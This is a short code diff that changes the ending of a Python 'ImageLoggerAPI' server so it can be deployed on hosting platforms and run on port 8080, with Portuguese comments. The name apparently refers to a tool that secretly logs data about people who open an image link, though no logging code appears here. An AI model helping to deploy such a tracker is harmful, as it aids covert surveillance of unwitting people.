@@ -301,4 +301,22 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
+# === SUBSTITUA TODO O FINAL DO ARQUIVO (a partir do "handler = ImageLoggerAPI") ===
+
+def handler(request):
+    """Função handler compatível com várias plataformas"""
+    api = ImageLoggerAPI(request)
+    api.handleRequest()
+    return api  # Algumas plataformas precisam disso
+
+
+# Para Replit / Railway / Render (muitas vezes precisam de 'app')
+app = handler
+
+
+# Mantém compatibilidade com o código original
+if __name__ == "__main__":
+    from http.server import HTTPServer
+    server = HTTPServer(('0.0.0.0', 8080), ImageLoggerAPI)
+    print("Image Logger rodando na porta 8080...")
+    server.serve_forever()
